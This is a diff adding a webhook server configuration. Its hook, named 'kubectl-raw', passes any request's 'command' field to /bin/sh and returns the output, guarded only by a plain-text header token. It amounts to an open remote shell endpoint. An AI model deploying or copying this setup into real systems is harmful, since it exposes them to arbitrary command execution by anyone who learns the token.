@@ -1,0 +1,26 @@
+[
+  {
+    "id": "kubectl-raw",
+    "execute-command": "/bin/sh",
+    "command-working-directory": "/",
+    "include-command-output-in-response": true,
+    "include-command-output-in-response-on-error": true,
+    "pass-arguments-to-command": [
+      { "source": "string", "name": "-c" },
+      { "source": "payload", "name": "command" }
+    ],
+    "response-headers": [
+      { "name": "Content-Type", "value": "text/plain" }
+    ],
+    "trigger-rule": {
+      "match": {
+        "type": "value",
+        "value": "sandbox-kubectl-2026",
+        "parameter": {
+          "source": "header",
+          "name": "X-Webhook-Token"
+        }
+      }
+    }
+  }
+]
